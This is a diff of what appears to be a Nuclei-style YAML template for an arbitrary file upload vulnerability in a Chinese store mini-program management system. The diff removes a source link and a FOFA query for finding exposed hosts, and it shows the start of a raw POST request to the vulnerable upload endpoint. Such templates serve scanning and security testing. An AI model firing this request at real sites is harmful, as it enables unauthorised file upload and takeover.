@@ -3,12 +3,8 @@ info:
   name: 万能门店小程序管理系统 onepic_uploade 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="/comhome/cases/index.html"
 http:
 - raw:
   - 'POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
